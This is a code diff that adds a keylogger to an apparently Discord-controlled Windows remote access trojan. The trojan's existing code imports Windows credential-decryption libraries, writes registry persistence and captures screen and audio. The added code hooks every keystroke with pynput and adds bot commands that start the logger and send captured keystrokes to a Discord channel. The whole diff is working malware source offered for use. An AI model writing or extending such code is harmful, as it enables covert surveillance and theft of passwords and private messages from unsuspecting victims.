@@ -13,6 +13,7 @@ import imageio
 import discord
 import asyncio
 import platform
+import threading
 import pyautogui
 import win32crypt
 import subprocess
@@ -20,6 +21,7 @@ import numpy as np
 import winreg as reg
 import urllib.request
 import sounddevice as sd
+from pynput import keyboard
 from datetime import datetime
 from Crypto.Cipher import AES
 from pydub import AudioSegment
@@ -27,9 +29,9 @@ from discord.ext import commands
 from win32crypt import CryptUnprotectData
 
 # Constants
-TOKEN = "" # Discord bot token
+TOKEN = "token" # Discord bot token
 USERNAME = os.getenv("USERNAME").lower()  # Windows usernamew
-GUILD_ID =   # Replace with your actual server ID (Interger)
+GUILD_ID = 123456 # Replace with your actual server ID (Interger)
 
 # Vars for bot
 intents = discord.Intents.default()
@@ -53,6 +55,11 @@ recording_task = None
 # Audio recording vars
 is_audiorecording = False
 
+# Keylogger data storage
+keylog_data = []
+keylogger_thread = None
+stop_event = threading.Event()
+last_logged_key = None
 
 # Functions
 def get_ip_address():
@@ -125,6 +132,65 @@ def add_to_register(program_path):
             
     except Exception as e:
         print("Register error {e}")
+
+# Keylogger function
+def keylogger():
+    def on_press(key):
+        global last_logged_key, keylog_data
+        try:
+            # Log regular characters
+            keylog_data.append(key.char)
+            last_logged_key = None  # reset on successful character input
+        except AttributeError:
+            # Handle special keys
+            if key == keyboard.Key.space:
+                # Log space as a single space
+                keylog_data.append(' ')
+                last_logged_key = None
+            else:
+                # List of special keys that we only want to log once in succession.
+                one_time_keys = [
+                    keyboard.Key.backspace,
+                    keyboard.Key.enter,
+                    keyboard.Key.alt,
+                    keyboard.Key.tab,
+                    keyboard.Key.up,
+                    keyboard.Key.down,
+                    keyboard.Key.left,
+                    keyboard.Key.right
+                ]
+                # If the key is in our one_time_keys list and is the same as last logged, skip logging.
+                if key in one_time_keys:
+                    if last_logged_key == key:
+                        return  # Skip duplicate logging
+                    # Log a friendly name for some keys
+                    if key == keyboard.Key.backspace:
+                        keylog_data.append(' [Backspace] ')
+                    elif key == keyboard.Key.enter:
+                        keylog_data.append(' [Enter] ')
+                    elif key == keyboard.Key.alt:
+                        keylog_data.append(' [Alt] ')
+                    elif key == keyboard.Key.tab:
+                        keylog_data.append(' [Tab] ')
+                    elif key in [keyboard.Key.up, keyboard.Key.down, keyboard.Key.left, keyboard.Key.right]:
+                        keylog_data.append(f' [{key.name.capitalize()}] ')
+                    last_logged_key = key
+                else:
+                    # For any other special key not listed, log its name
+                    keylog_data.append(f' [{key}] ')
+                    last_logged_key = key
+
+    def on_release(key):
+        if key == keyboard.Key.esc:
+            # Stop listener
+            stop_event.set()
+            return False
+
+    # Collect events until the stop event is set
+    with keyboard.Listener(
+            on_press=on_press,
+            on_release=on_release) as listener:
+        listener.join()
 
 async def main_loop():
     while True:
@@ -478,6 +544,35 @@ async def screen(ctx, action: str):
 
     except Exception as e:
         await ctx.send(f"❌ Error: {str(e)}")
+
+@bot.command()
+async def start_keylogger(ctx):
+    global keylogger_thread
+    if keylogger_thread is not None and keylogger_thread.is_alive():
+        await ctx.send('Keylogger is already running.')
+    else:
+        keylogger_thread = threading.Thread(target=keylogger)
+        keylogger_thread.start()
+        await ctx.send('Keylogger started.')
+
+# Command to get the keylog data
+@bot.command()
+async def get_keylog(ctx):
+    logged_keys = ''.join(keylog_data)
+    await ctx.send(f'Keylog data: {logged_keys}')
+    # Clear the keylog data after sending
+    keylog_data.clear()
+
+# Command to stop the keylogger
+@bot.command()
+async def stop_keylogger(ctx):
+    global keylogger_thread
+    if keylogger_thread is not None and keylogger_thread.is_alive():
+        stop_event.set()
+        keylogger_thread.join()
+        await ctx.send('Keylogger stopped.')
+    else:
+        await ctx.send('Keylogger is not running.')
 
 @bot.event
 async def on_ready():
